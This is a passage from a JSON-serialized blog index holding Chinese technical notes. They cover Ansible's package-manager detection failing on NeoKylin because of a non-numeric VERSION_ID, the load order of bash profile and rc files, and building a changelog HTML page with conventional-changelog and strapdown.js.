distro, the ansible_fact entry should be\\n        # the default package manager officially supported by the distro.\\n        if collected_facts[\'ansible_os_family\'] == \\"RedHat\\":\\n            pkg_mgr_name = self._check_rh_versions(pkg_mgr_name, collected_facts)\\n... ...\\n\\n def _check_rh_versions(self, pkg_mgr_name, collected_facts):\\n        if collected_facts[\'ansible_distribution\'] == \'Fedora\':\\n            if os.path.exists(\'/run/ostree-booted\'):\\n                return \\"atomic_container\\"\\n            try:\\n                if int(collected_facts[\'ansible_distribution_major_version\']) < 23:\\n                    for yum in [pkg_mgr for pkg_mgr in PKG_MGRS if pkg_mgr[\'name\'] == \'yum\']:\\n                        if os.path.exists(yum[\'path\']):\\n                            pkg_mgr_name = \'yum\'\\n                            break\\n                else:\\n                    for dnf in [pkg_mgr for pkg_mgr in PKG_MGRS if pkg_mgr[\'name\'] == \'dnf\']:\\n                        if os.path.exists(dnf[\'path\']):\\n                            pkg_mgr_name = \'dnf\'\\n                            break\\n            except ValueError:\\n                # If there\'s some new magical Fedora version in the future,\\n                # just default to dnf\\n                pkg_mgr_name = \'dnf\'\\n        elif collected_facts[\'ansible_distribution\'] == \'Amazon\':\\n            pkg_mgr_name = \'yum\'\\n        else:\\n            # If it\'s not one of the above and it\'s Red Hat family of distros, assume\\n            # RHEL or a clone. For versions of RHEL < 8 that Ansible supports, the\\n            # vendor supported official package manager is \'yum\' and in RHEL 8+\\n            # (as far as we know at the time of this writing) it is \'dnf\'.\\n            # If anyone wants to force a non-official package manager then they\\n            # can define a provider to either the package or yum action plugins.\\n            if int(collected_facts[\'ansible_distribution_major_version\']) < 8:\\n                pkg_mgr_name = \'yum\'\\n            else:\\n                pkg_mgr_name = \'dnf\'\\n        return pkg_mgr_name\\n\\n```\\n\u4ee5\u4e0a\u4ee3\u7801\u53ef\u4ee5\u770b\u5230\u5f53\u5224\u65ad\u7cfb\u7edf\u4e3a\u7ea2\u5e3d\u7cfb\uff0c\u5219\u4f1a\u7ee7\u7eed\u5224\u65ad\u7cfb\u7edf\u7248\u672c\u4fe1\u606f\uff0c\u5f53\u4e3b\u7248\u672c\u53f7\u5c0f\u4e8e8\u5219\u4f7f\u7528yum\uff0c\u5426\u5219\u4f7f\u7528dnf\uff0c\u8fd9\u91cc\u6211\u4eec\u521d\u6b65\u5224\u65ad\u4e3a\u9e92\u9e9f\u5bf9\u7cfb\u7edf\u505a\u4e86\u67d0\u4e9b\u4fee\u6539\u5bfc\u81f4\u65e0\u6cd5\u83b7\u53d6\u5230\u4e3b\u7248\u672c\u53f7\u3002\u5148\u6267\u884csetup\u83b7\u53d6\u53d1\u884c\u7248\u4ee3\u53f7\u9a8c\u8bc1\u4e0b\u662f\u5426\u6267\u884c\u4e86\u4e0a\u8ff0\u903b\u8f91\uff1a\\n\\n```\\n# ansible -i hosts node01 -m setup -a \\"filter=ansible_distribution\\"\\nnode01 | SUCCESS => {\\n    \\"ansible_facts\\": {\\n        \\"ansible_distribution\\": \\"RedHat\\",\\n        \\"discovered_interpreter_python\\": \\"/usr/bin/python\\"\\n    },\\n    \\"changed\\": false\\n}\\n\\n# ansible -i hosts node01 -m setup -a \\"filter=ansible_distribution_major_version\\"\\nnode01 | SUCCESS => {\\n    \\"ansible_facts\\": {\\n        \\"ansible_distribution_major_version\\": \\"V7Update6\\",\\n        \\"discovered_interpreter_python\\": \\"/usr/bin/python\\"\\n    },\\n    \\"changed\\": false\\n}\\n```\\n\u901a\u8fc7setup\u6a21\u5757\u7684\u8f93\u51fa\u7ed3\u679c\u53ef\u770b\u5230\u7cfb\u7edf\u662f\u5224\u65ad\u4e3aredhat\u53d1\u884c\u7248\uff0c\u4f46\u662f\u901a\u8fc7ansible_distribution_major_version\u83b7\u53d6\u5230\u7684\u53d1\u884c\u7248\u4e3b\u7248\u672c\u53f7\u4e3aV7Update6,\\n\u800c\u548c\u4e0a\u9762\u5224\u65adyum\u7248\u672c\u7684\u4ee3\u7801\u5173\u8054\u8d77\u6765\u770b\u5c31\u4f1a\u53d1\u73b0\u95ee\u9898\u6240\u5728\uff0cint(collected_facts[\'ansible_distribution_major_version\']) < 8 \u4e2d\uff0cansible_distribution_major_version \u53d8\u91cf\u5728\u5176\u521d\u59cb\u5316\u7684\u4ee3\u7801\u4e2d\u5bf9\u5e94\u4e3a\u4e3adistribution_version.split(\'.\')[:2][0]\u7684\u53d6\u503c\uff0c\u800c\u5f53\u7cfb\u7edf\u4e2d\u83b7\u53d6\u5230\u7684\u503c\u662fV7Update6\u65f6\uff0c\u8be5\u663e\u7136\u65e0\u6cd5\u6ee1\u8db3\u8f6c\u6362\u4e3aint\u7684\u8981\u6c42\u3002\u63a5\u4e0b\u6765\u770b\u4e0bV7Update6\u8fd9\u4e2a\u5173\u952e\u5b57\u7684\u5b9a\u4e49\u4f4d\u7f6e\uff0c\u6839\u636e\u7ecf\u9a8c\u7cfb\u7edf\u7248\u672c\u76f8\u5173\u4fe1\u606f\u5e94\u8be5\u5728/etc/os-release\u4e2d\uff1a\\n\\n```\\n~]# cat /etc/os-release\\nNAME=\\"NeoKylin Linux Advanced Server\\"\\nVERSION=\\"V7Update6 (Chromium)\\"\\nID=\\"neokylin\\"\\nID_LIKE=\\"fedora\\"\\nVARIANT=\\"Server\\"\\nVARIANT_ID=\\"server\\"\\nVERSION_ID=\\"V7Update6\\"\\nPRETTY_NAME=\\"NeoKylin Linux Advanced Server V7Update6 (Chromium)\\"\\nANSI_COLOR=\\"0;31\\"\\nCPE_NAME=\\"cpe:/o:neokylin:enterprise_linux:V7Update6:GA:server\\"\\nHOME_URL=\\"https://www.cs2c.com.cn/\\"\\nBUG_REPORT_URL=\\"https://bugzilla.cs2c.com.cn/\\"\\n\\nNEOKYLIN_BUGZILLA_PRODUCT=\\"NeoKylin Linux Advanced Server 7\\"\\nNEOKYLIN_BUGZILLA_PRODUCT_VERSION=V7Update6\\nNEOKYLIN_SUPPORT_PRODUCT=\\"NeoKylin Linux Advanced Server\\"\\nNEOKYLIN_SUPPORT_PRODUCT_VERSION=\\"V7Update6\\"\\n```\\n\u8fd9\u91cc\u679c\u7136\u53ef\u4ee5\u770b\u5230VERSION_ID\u7684\u503c\u88ab\u5b9a\u4e49\u4e3a```V7Update6```\uff0c\u800c\u7cfb\u7edf\u539f\u751f\u53d1\u884c\u7248\u4e2d\u8be5\u503c\u662f7\uff0c\u6211\u4eec\u6765\u770b\u4e0bos-release\u4e2d\u5bf9VERSION_ID\u53c2\u6570\u7684\u8bf4\u660e\uff1a\\n\\n```\\nman os-release\\n... ...\\n\\n       VERSION_ID=\\n           A lower-case string (mostly numeric, no spaces or other characters outside of 0-9, a-z, \\".\\",\\n           \\"_\\" and \\"-\\") identifying the operating system version, excluding any OS name information or\\n           release code name, and suitable for processing by scripts or usage in generated filenames. This\\n           field is optional. Example: \\"VERSION_ID=17\\" or \\"VERSION_ID=11.04\\".\\n... ...\\n```\\n\\n\u6839\u636eman\u6587\u6863\u4e2d\u7684\u63cf\u8ff0\uff0cVERSION_ID\u53d6\u503c\u8303\u56f4\u4e3a\u5168\u5c0f\u5199\uff0c\u901a\u5e38\u4e3a\u6570\u503c\u578b\uff0c\u4e0d\u5e94\u6709\u7a7a\u683c\u6216\u5176\u4ed6\u7279\u6b8a\u5b57\u7b26\uff0c\u53ef\u5305\u542b\u7684\u5b57\u7b26\u4e3a0-9a-z._-,\u90a3\u4e48\u8fd9\u91cc\u53ef\u4ee5\u770b\u5230\u4e24\u4e2a\u95ee\u9898\uff0c\\n\u7b2c\u4e00\u4e2a\u95ee\u9898\u662fkylin\u7684VERSION_ID\u4e0d\u7b26\u5408\u6b64\u63cf\u8ff0\uff0c\u5305\u542b\u4e86\u5927\u5199\u5b57\u7b26\uff0c\u7b2c\u4e8c\u4e2a\u95ee\u9898\u662fVERSION_ID\u53ef\u4ee5\u5305\u542ba-z\u5b57\u6bcd\uff0c\u4f46\u662f\u901a\u5e38\u662f\u6570\u503c\u598217,11.04\u7b49\u3002\\n\u4f46\u7531\u4e8e\u5e38\u89c1\u53d1\u884c\u7248\u90fd\u5c06\u6b64\u5904\u5904\u7406\u4e3a\u6570\u503c\u578b\uff0c\u5c31\u5bfc\u81f4ansible\u6309\u7167\u6b64\u7ea6\u5b9a\u4fd7\u6210\u56fa\u5316\u4e86\u5176\u83b7\u53d6\u7cfb\u7edf\u7248\u672c\u7684\u65b9\u6cd5\uff0c\u5e76\u8bd5\u56fe\u5c06\u4e00\u4e2a\u5b57\u7b26\u4e32\u8f6c\u6362\u4e3aint\uff0c\u4e0d\u80fd\u6ee1\u8db3\u5f53VERSION_ID\u5305\u542b\u4e86\u5b57\u6bcd\u7684\u60c5\u51b5\u3002\\n\\n## \u9a8c\u8bc1\u7ed3\u8bba\\n\\n\u901a\u8fc7\u4ee5\u4e0a\u5224\u65ad\u770b\u5230VERSION_ID\u662f\u5bfc\u81f4\u8be5\u95ee\u9898\u73b0\u8c61\u7684\u5173\u952e\uff0c\u90a3\u4e48\u6211\u4eec\u53ef\u4ee5\u5c1d\u8bd5\u4fee\u6539\u4e00\u4e0b\u8be5\u53c2\u6570\u503c\uff0c\u518d\u6267\u884csetup\u770b\u770b\u662f\u5426\u53ef\u4ee5\u6b63\u5e38\u5de5\u4f5c\uff1a\\n```\\n# grep VERSION_ID /etc/os-release\\nVERSION_ID=\\"7\\"\\n```\\n\\n\u8fd9\u91cc\u6211\u628aVERSION_ID\u4fee\u6539\u6210\u4e86\u6570\u5b577\uff0c\u518d\u6267\u884csetup\u89c2\u5bdfansible_pkg_mgr\u53d8\u91cf\u662f\u5426\u80fd\u83b7\u53d6\u5230\uff1a\\n```\\n# ansible -i hosts node01 -m setup -a \\"filter=ansible_pkg_mgr\\"\\nnode01 | SUCCESS => {\\n    \\"ansible_facts\\": {\\n        \\"ansible_pkg_mgr\\": \\"yum\\",\\n        \\"discovered_interpreter_python\\": \\"/usr/bin/python\\"\\n    },\\n    \\"changed\\": false\\n}\\n```\\n\u53ef\u4ee5\u770b\u5230\uff0c\u4fee\u6539os-release\u4e2dVERSION_ID\u4e3a\u7eaf\u6570\u503c\u540e\uff0csetup\u5c31\u53ef\u4ee5\u6b63\u5e38\u5224\u65ad\u5230\u7cfb\u7edf\u7248\u672c\uff0c\u8fdb\u800c\u53ef\u4ee5\u83b7\u53d6\u5230\u6b63\u786e\u7684yum\u7248\u672c\u4e86\u3002\\n\u901a\u8fc7\u4ee5\u4e0a\u53ef\u4ee5\u770b\u5230\u64cd\u4f5c\u7cfb\u7edf\u4e2d\u5373\u4fbf\u662f\u4e00\u4e9b\u4e0d\u8d77\u773c\u7684\u7ec6\u679d\u672b\u8282\uff0c\u5904\u7406\u4e0d\u5f53\u4e5f\u53ef\u80fd\u5f15\u53d1\\"\u8fde\u9501\u53cd\u5e94\\"\u3002"},{"id":"/2021/02/24/bash-rc-profile-exec-order","metadata":{"permalink":"/notes/blog/2021/02/24/bash-rc-profile-exec-order","editUrl":"https://github.com/itxx00/notes/tree/main/blog/2021-02-24-bash-rc-profile-exec-order.md","source":"@site/blog/2021-02-24-bash-rc-profile-exec-order.md","title":"bashrc\u4e0eprofile\u7684\u52a0\u8f7d\u987a\u5e8f","description":"\u770b\u4e0bbashrc\u548cprofile\u7684\u6267\u884c\u987a\u5e8f\u5230\u5e95\u662f\u4ec0\u4e48\u6837\u7684","date":"2021-02-24T00:00:00.000Z","tags":[{"inline":true,"label":"bash","permalink":"/notes/blog/tags/bash"}],"readingTime":2.71,"hasTruncateMarker":false,"authors":[],"frontMatter":{"layout":"post","title":"bashrc\u4e0eprofile\u7684\u52a0\u8f7d\u987a\u5e8f","description":"\u770b\u4e0bbashrc\u548cprofile\u7684\u6267\u884c\u987a\u5e8f\u5230\u5e95\u662f\u4ec0\u4e48\u6837\u7684","categories":["shell"],"tags":["bash"]},"unlisted":false,"prevItem":{"title":"\u4e2d\u6807\u9e92\u9e9f\u7cfb\u7edfansible\u6267\u884cyum\u6a21\u5757\u62a5\u9519\u7684\u95ee\u9898\u5206\u6790","permalink":"/notes/blog/2021/03/22/neokylin-ansible-yum-module-not-work"},"nextItem":{"title":"\u4f7f\u7528conventional-changelog\u548cStrapdown.js\u4e3agit\u4ed3\u5e93\u81ea\u52a8\u751f\u6210changelog html\u9875\u9762","permalink":"/notes/blog/2021/01/15/auto-create-changelog-html"}},"content":"> \u5728\u4f7f\u7528bashrc\u548cprofile\u8bbe\u7f6e\u73af\u5883\u53d8\u91cf\u65f6\uff0c\u5982\u679c\u591a\u4e2a\u5730\u65b9\u90fd\u6709\u540c\u4e00\u4e2a\u53d8\u91cf\u7684\u8bbe\u7f6e\uff0c\u5219\u9700\u8981\u6ce8\u610f\u4e0d\u540c\u914d\u7f6e\u6587\u4ef6\u7684\u52a0\u8f7d\u987a\u5e8f\u95ee\u9898\\n\\n\\n## \u80cc\u666f\\n\u5982\u679c\u52a0\u8f7d\u987a\u5e8f\u6ca1\u5f04\u660e\u767d\uff0c\u6709\u53ef\u80fd\u4f1a\u5728\u4f7f\u7528\u8fc7\u7a0b\u4e2d\u9047\u5230\u5404\u79cd\u56f0\u6270\uff0c\u6bd4\u5982\u4e3a\u4ec0\u4e48\u8bbe\u7f6e\u4e86profile\u4f46\u662f\u73af\u5883\u53d8\u91cf\u4e0d\u751f\u6548\uff1f\u4e3a\u4ec0\u4e48\u53d8\u91cfssh\u540e\u83b7\u53d6\u7684\u4e0d\u4e00\u6837\uff1f\u4e0b\u9762\u6211\u4eec\u4ee5CentOS7\u7cfb\u7edf\u4e3a\u4f8b\uff0c\u901a\u8fc7\u4e00\u4e2a\u7b80\u5355\u7684\u5c0f\u5b9e\u9a8c\u6765\u89c2\u5bdf\u4e0b\u5230\u5e95bash\u7684\u51e0\u4e2a\u914d\u7f6e\u6587\u4ef6\u52a0\u8f7d\u987a\u5e8f\u662f\u600e\u6837\u7684\u3002\\n\\n\u6211\u4eec\u77e5\u9053\u53ef\u4ee5\u7528\u6765\u8bbe\u7f6e\u73af\u5883\u53d8\u91cf\u7684\u6587\u4ef6\u5e38\u7528\u7684\u6709\u4ee5\u4e0b\u51e0\u4e2a\uff1a\\n- /etc/profile\\n- /etc/profile.d/*.sh\\n- /etc/bashrc\\n- ~/.bash_profile\\n- ~/.bashrc\\n\\n\\n\u800c\u4e0d\u540c\u7684\u6587\u4ef6\u52a0\u8f7d\u65f6\u673a\u53c8\u5206\u4e3alogin shell\u548cnon-login shell\u4e24\u79cd\u60c5\u51b5\u3002\u8fd9\u4e24\u79cd\u60c5\u51b5\u9700\u8981\u533a\u5206\u5bf9\u5f85\uff0c\u53ca\u4e0d\u540c\u7684\u6587\u4ef6\u8981\u5728\u5bf9\u5e94\u573a\u666f\u4e0b\u624d\u80fd\u751f\u6548\u3002\u5047\u8bbe\u6709\u4e00\u4e2a\u76f8\u540c\u7684\u53d8\u91cf\u8bbe\u7f6e\u51fa\u73b0\u5728\u5404\u4e2a\u6587\u4ef6\u91cc\u9762\uff0c\u901a\u8fc7\u5bf9\u4e0d\u540c\u6587\u4ef6\u7684\u53d8\u91cf\u503c\u8fdb\u884c\u5dee\u5f02\u8bbe\u7f6e\u5373\u53ef\u89c2\u5bdf\u51fa\u5404\u4e2a\u914d\u7f6e\u7684\u52a0\u8f7d\u4f18\u5148\u7ea7\u548c\u751f\u6548\u60c5\u51b5\u3002\\n\\n## \u5b9e\u9a8c\\n\u5148\u5199\u5165\u5404\u4e2a\u914d\u7f6e\u6587\u4ef6\u5982\u4e0b\uff1a\\n```\\n# tail -n1 /etc/profile /etc/bashrc /etc/profile.d/well.sh ~/.bash_profile ~/.bashrc\\n==> /etc/profile <==\\nexport WELL=etc-profile\\n\\n==> /etc/bashrc <==\\nexport WELL=etc-bashrc\\n\\n==> /etc/profile.d/well.sh <==\\nexport WELL=etc-profile-d\\n\\n==> /root/.bash_profile <==\\nexport WELL=home-bash-profile\\n\\n==> /root/.bashrc <==\\nexport WELL=home-bashrc\\n```\\n\\n\u63a5\u4e0b\u6765\u5f00\u59cb\u89c2\u5bdf\uff0c\u9700\u8981\u6ce8\u610f\u7684\u662f\u6bcf\u6b21\u4fee\u6539\u914d\u7f6e\u4e4b\u540e\u65b0\u5f00shell\u91cd\u65b0\u52a0\u8f7d\u73af\u5883\u914d\u7f6e\uff1a\\n\\n```\\n[root@localhost ~]# echo $WELL\\nhome-bash-profile\\n[root@localhost ~]# ssh localhost \'echo $WELL\'\\nhome-bashrc\\n[root@localhost ~]#\\n\\n\\n[root@localhost ~]# sed -i \'$d\' ~/.bashrc\\n[root@localhost ~]# sed -i \'$d\' ~/.bash_profile\\n[root@localhost ~]#\\n\\n\\n[root@localhost ~]# echo $WELL\\netc-bashrc\\n[root@localhost ~]# ssh localhost \'echo $WELL\'\\netc-bashrc\\n[root@localhost ~]#\\n\\n\\n[root@localhost ~]# sed -i \'$d\' /etc/bashrc\\n\\n\\n[root@localhost ~]# echo $WELL\\netc-profile\\n[root@localhost ~]# ssh localhost \'echo $WELL\'\\netc-profile-d\\n[root@localhost ~]#\\n\\n# \u91cd\u65b0\u5199\u5165~/.bashrc\u540e\\n[root@localhost ~]# echo $WELL\\nhome-bashrc\\n[root@localhost ~]# ssh localhost \'echo $WELL\'\\netc-profile-d\\n[root@localhost ~]#\\n\\n\\n# \u91cd\u65b0\u5199\u5165~/.bash_profile,\u53bb\u6389~/.bashrc\u540e\\n[root@localhost ~]# echo $WELL\\nhome-bash-profile\\n[root@localhost ~]# ssh localhost \'echo $WELL\'\\netc-profile-d\\n[root@localhost ~]#\\n\\n```\\n\\n\u9700\u8981\u6ce8\u610f\u7684\u662f\u4ee5\u4e0a\u6d4b\u8bd5\u662f\u5c06\u53d8\u91cf\u653e\u5230\u6bcf\u4e2a\u914d\u7f6e\u672b\u884c\uff0c\u56e0\u4e3a\u914d\u7f6e\u4e4b\u95f4\u6709\u4e92\u76f8\u52a0\u8f7d\u7684\u673a\u5236\uff0c\u5982\u679c\u653e\u5728\u5176\u4ed6\u4f4d\u7f6e\u5219\u6d4b\u8bd5\u7ed3\u679c\u4f1a\u4e0d\u4e00\u6837\u3002\\n\\n## \u7ed3\u8bba\\n\u89c2\u5bdf\u4e0a\u9762\u7684\u7ed3\u679c\uff0c\u53ef\u4ee5\u5f97\u51fa\u4ee5\u4e0b\u5b9e\u9a8c\u7ed3\u8bba\uff1a\\n\\n1 login shell\u4f1a\u52a0\u8f7d\u6240\u6709\u914d\u7f6e,\u4f18\u5148\u7ea7\u4e3a~/.bash_profile ~/.bashrc /etc/bashrc /etc/profile /etc/profile.d\\n\\n2 non-login shell\u65f6\u52a0\u8f7d\u4f18\u5148\u7ea7\u4e3a ~/.bashrc /etc/bashrc /etc/profile.d\\n\\n3 non-login shell\u4e0d\u4f1a\u52a0\u8f7d\u7684\u914d\u7f6e\u6709 ~/.bash_profile /etc/profile\\n\\n4 \u4e24\u79cd\u60c5\u51b5\u4e0b\u90fd\u4f1a\u52a0\u8f7d\u7684\u6709~/.bashrc /etc/bashrc /etc/profile.d\\n\\n\u90a3\u4e48\u5982\u679c\u6211\u4eec\u9700\u8981\u5728\u7cfb\u7edf\u5168\u5c40\u8bbe\u7f6e\u4e00\u4e2a\u73af\u5883\u53d8\u91cf\uff0c\u8981\u4fdd\u8bc1login shell\u548cnon-login shell\u90fd\u80fd\u8868\u73b0\u4e00\u81f4\uff0c\u9700\u8981\u5982\u4f55\u8bbe\u7f6e\u5462\uff1f\\n\\n\u56e0\u4e3a~/.bashrc\u4e3a\u7528\u6237\u5c40\u90e8\u914d\u7f6e\u6587\u4ef6\uff0c\u4e0d\u5f71\u54cd\u5168\u5c40\uff0c\u800c/etc/bashrc\u4e3a\u7cfb\u7edf\u5185\u7f6e\u6587\u4ef6\u4e0d\u5efa\u8bae\u4fee\u6539\uff0c\u5982\u679c\u662f\u6709\u5168\u5c40\u73af\u5883\u53d8\u91cf\u9700\u8981\u8bbe\u7f6e\u5efa\u8bae\u653e\u7f6e\u5230/etc/profile.d\\n\\n\\nover."},{"id":"/2021/01/15/auto-create-changelog-html","metadata":{"permalink":"/notes/blog/2021/01/15/auto-create-changelog-html","editUrl":"https://github.com/itxx00/notes/tree/main/blog/2021-01-15-auto-create-changelog-html.md","source":"@site/blog/2021-01-15-auto-create-changelog-html.md","title":"\u4f7f\u7528conventional-changelog\u548cStrapdown.js\u4e3agit\u4ed3\u5e93\u81ea\u52a8\u751f\u6210changelog html\u9875\u9762","description":"\u901a\u8fc7\u7b80\u5355\u7684\u5de5\u5177\u7ec4\u5408\u4e3agit\u9879\u76ee\u751f\u6210\u7b80\u5355\u7684changelog html","date":"2021-01-15T00:00:00.000Z","tags":[{"inline":true,"label":"changelog","permalink":"/notes/blog/tags/changelog"},{"inline":true,"label":"conventional-changelog","permalink":"/notes/blog/tags/conventional-changelog"},{"inline":true,"label":"strapdown.js","permalink":"/notes/blog/tags/strapdown-js"}],"readingTime":2.45,"hasTruncateMarker":false,"authors":[],"frontMatter":{"layout":"post","title":"\u4f7f\u7528conventional-changelog\u548cStrapdown.js\u4e3agit\u4ed3\u5e93\u81ea\u52a8\u751f\u6210changelog html\u9875\u9762","description":"\u901a\u8fc7\u7b80\u5355\u7684\u5de5\u5177\u7ec4\u5408\u4e3agit\u9879\u76ee\u751f\u6210\u7b80\u5355\u7684changelog html","categories":["shell"],"tags":["changelog","conventional-changelog","strapdown.js"]},"unlisted":false,"prevItem":{"title":"bashrc\u4e0eprofile\u7684\u52a0\u8f7d\u987a\u5e8f","permalink":"/notes/blog/2021/02/24/bash-rc-profile-exec-order"},"nextItem":{"title":"\u4f7f\u7528rpmrebuild\u4fee\u6539rpm\u5305\u5185\u5bb9","permalink":"/notes/blog/2020/04/07/change-rpm-file-using-rpmrebuild"}},"content":"> \u4e00\u4e2a\u9879\u76ee\u7684changelog\u5bf9\u4e8e\u4f7f\u7528\u8005\u6765\u8bf4\u867d\u7136\u4e0d\u9700\u8981\u91cd\u70b9\u5173\u6ce8\uff0c\u4f46\u5f88\u91cd\u8981\\n\\n\\n## \u57fa\u672c\u601d\u8def\\n\\n\u901a\u5e38\u8f6f\u4ef6\u4ea7\u54c1\u5bf9\u5916\u53d1\u5e03\u65f6\uff0c\u6211\u4eec\u9700\u8981\u63d0\u4f9b\u4e00\u4efdchangelog\u4ee5\u544a\u77e5\u4f7f\u7528\u8005\u65b0\u7248\u672c\u6240\u53d1\u751f\u7684\u53d8\u5316\uff0c\u6709\u4e24\u79cd\u65b9\u5f0f\u53ef\u4ee5\u4ea7\u751f\u9700\u8981\u7684changelog\u5185\u5bb9\uff0c \u4e00\u79cd\u662f\u4eba\u5de5\u6574\u7406\u548c\u7f16\u5199\uff0c\u53e6\u5916\u4e00\u79cd\u662f\u901a\u8fc7\u5de5\u5177\u5b9e\u73b0\u81ea\u52a8\u5316\u3002\u8fd9\u91cc\u4ecb\u7ecd\u4e00\u79cd\u901a\u8fc7\u5f00\u6e90\u5de5\u5177\u7684\u7ec4\u5408\u5feb\u901f\u5b9e\u73b0\u81ea\u52a8\u751f\u6210\u7684\u65b9\u6cd5\u3002\\n\\n\\n\u6211\u4eec\u5728\u5f00\u53d1\u8fc7\u7a0b\u4e2d\u6240\u6709\u53d8\u66f4\u90fd\u4f1a\u53cd\u6620\u5230git commit messages\u91cc\u9762\uff0cgit\u63d0\u4ea4\u5386\u53f2\u51e0\u4e4e\u53ef\u4ee5\u53cd\u6620\u8f6f\u4ef6\u7684\u6240\u6709\u53d8\u66f4\uff0c\u57fa\u4e8e\u6b64\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528\u5de5\u5177\u76f4\u63a5\u5c06git\u63d0\u4ea4\u5386\u53f2\u8f6c\u5316\u4e3achangelog\uff0c\u518d\u7ecf\u8fc7\u7b80\u5355\u52a0\u5de5\u5904\u7406\u5373\u53ef\u5bf9\u5916\u8f93\u51fa\u4e00\u4e2ahtml\u9875\u9762\u3002\\n\\n## \u89c4\u8303\u63d0\u4ea4\\n\\n\u8fd9\u5c31\u8981\u6c42\u5728\u4ee3\u7801\u63d0\u4ea4\u8fc7\u7a0b\u4e2d\u6211\u4eec\u7684commit message\u8981\u89c4\u8303\u5316\uff0c\u5176\u4e2d\u4e00\u79cd\u88ab\u5e7f\u4e3a\u8ba4\u53ef\u7684\u89c4\u8303\u540d\u4e3a\u7ea6\u5b9a\u5f0f\u63d0\u4ea4\u3002\u8be6\u7ec6\u53ef\u53c2\u8003[\u7ea6\u5b9a\u5f0f\u63d0\u4ea4](https://www.conventionalcommits.org/zh-hans)\\n\u4e00\u4e2a\u7b80\u5355\u7684\u63d0\u4ea4\u7c7b\u578b\u53c2\u8003\u5982\u4e0b\uff1a\\n\\n- **build**: \u53d8\u66f4\u4ec5\u5f71\u54cd\u5de5\u5177\u51fa\u5305\u6216\u8005build\u73af\u5883\u7b49\u5916\u90e8\u4f9d\u8d56\u95ee\u9898\\n- **ci**: \u5bf9CI\u914d\u7f6e\u7684\u53d8\u66f4\\n- **docs**: \u4ec5\u6587\u6863\u5185\u5bb9\u53d8\u66f4\\n- **feat**: \u65b0\u7279\u6027\\n- **fix**: bug\u4fee\u590d\\n- **perf**: \u65e0bug\u4fee\u590d/\u65e0\u65b0\u7279\u6027\uff0c\u4ec5\u6027\u80fd\u63d0\u5347\\n- **refactor**: \u65e0bug\u4fee\u590d/\u65e0\u65b0\u7279\u6027/\u65e0\u6027\u80fd\u63d0\u5347\uff0c\u4ec5\u91cd\u6784\\n- **style**: \u4ec5\u4ee3\u7801\u98ce\u683c\u66f4\u6539\\n- **test**: \u4ec5\u6d4b\u8bd5\u4ee3\u7801\u53d8\u66f4\\n\\n## \u63d0\u4ea4\u8f6c\u5316\u4e3amarkdown\\n\\n\u6709\u4e86\u89c4\u8303\u7684\u63d0\u4ea4\u8bb0\u5f55\uff0c\u4e0b\u9762\u5c31\u53ef\u4ee5\u901a\u8fc7\u5de5\u5177\u5b9e\u73b0\u63d0\u4ea4\u8bb0\u5f55\u5230markdown\u7684\u8f6c\u5316\u3002\u8fd9\u91cc\u4ecb\u7ecd\u4e00\u4e2a\u5de5\u5177\u53ebconventional-changelog\uff0c\u547d\u4ee4\u884c\u7248\u672c\u4f7f\u7528\u65b9\u6cd5\u5982\u4e0b\uff1a\\n```\\n# install\\nnpm install -g conventional-changelog-cli\\n# generate changelog markdown file\\ncd your-git-repo-project-home\\nconventional-changelog -p angular -i CHANGELOG.md -s -r 0\\n```\\n\u793a\u4f8b\u4e2d\u7528\u5230\u7684\u53c2\u6570\uff1a\\n- -i : \u8bfb\u5165\u5df2\u6709changelog\u6587\u4ef6\\n- -p : \u9884\u8bbe\u6a21\u677f\uff0c\u53ef\u4ee5\u662fangular/atom/codemirror/ember/eslint/express/jquery/jscs/jshint\\n- -s : \u5199\u5230\u76ee\u6807\u6587\u4ef6\u540d\u548c-i\u6307\u5b9a\u7684\u6587\u4ef6\u540c\u540d\\n- -r : \u6307\u5b9a\u9700\u8981\u751f\u6210\u7684release\u6570\u91cf\uff0c0\u8868\u793a\u91cd\u65b0\u751f\u6210\u6240\u6709\\n\\n\u66f4\u591a\u53c2\u6570\u53ef\u4ee5\u6267\u884c```conventional-changelog --help```\u67e5\u770b\u3002\\n\\n## markdown\u8f6c\u5316\u4e3ahtml\\n\\n\u8fd9\u6837\u6211\u4eec\u5c31\u5f97\u5230\u4e86\u4e00\u4efd\u540d\u4e3aCHANGELOG.md\u7684\u5386\u53f2\u53d8\u66f4\u8bb0\u5f55\u6587\u4ef6\uff0c\u4e3amarkdown\u683c\u5f0f\u3002\u63a5\u4e0b\u6765\u518d\u901a\u8fc7\u53e6\u5916\u4e00\u4e2a\u5de5\u5177\u540d\u53ebstrapdown.js\u6765\u81ea\u52a8\u751f\u6210html\u3002\\n\\nstrapdown.js\u662f\u4e00\u4e2ajs\u6587\u4ef6\uff0c\u4e0d\u9700\u8981\u50cf\u4e0a\u9762\u751f\u6210markdown\u90a3\u6837\u5728server\u7aef\u751f\u6210\uff0c\u53ea\u9700\u8981\u5728\u5355\u4e2ahtml\u9875\u9762\u4e2d\u5f15\u5165\u8be5js\u6587\u4ef6\u5373\u53ef\u5b9e\u73b0\u4ecemarkdown\u81ea\u52a8\u6e32\u67d3\u51fahtml\u9875\u9762\u3002\u8be6\u7ec6\u53ef\u53c2\u8003[strapdown.js](https://strapdownjs.com/)\\n\\n\u4f7f\u7528\u65b9\u6cd5\u5982\u4e0b\uff1a\\n```\\ncat >changelog.html <<\\"EOF\\"\\n<!DOCTYPE html>\\n<html>\\n<title>XXX Changelog</title>\\n<meta charset=\\"utf-8\\">\\n<xmp theme=\\"darkly\\" style=\\"display:none;\\">\\nEOF\\n\\ncat CHANGELOG.md >>changelog.html\\ncat >>changelog.html <<\\"EOF\\"\\n</xmp>\\n<script src=\\"http://strapdownjs.com/v/0.2/strapdown.js\\"><\/script>\\n</html>\\n```\\n\u8fd9\u6837\u6211\u4eec\u5c31\u901a\u8fc7\u62fc\u63a5\u7684\u65b9\u5f0f\u751f\u6210\u4e86\u4e00\u4efdchangelog.html\u3002\u9700\u8981\u6ce8\u610f\u7684\u662fchanglog\u5185\u5bb9\u4e2d\u4e0d\u80fd\u5305\u542b```</xmp>```\u5173\u952e\u5b57\u3002\\n\\nover."},{"id":"/2020/04/07/change-rpm-file-using-rpmrebuild","metadata":{"permalink":"/notes/blog/2020/04/07/change-rpm-file-using-rpmrebuild","editUrl":"https://github.com/itxx00/notes/tree/main/blog/2020-04-07-change-rpm-file-using-rpmrebuild.md","source":"@site/blog/2020-04-07-change-rpm-file-using-rpmrebuild.md","title":"\u4f7f\u7528rpmrebuild\u4fee\u6539rpm\u5305\u5185\u5bb9","description":"\u4e00\u79cdrpm\u5305\u7684\u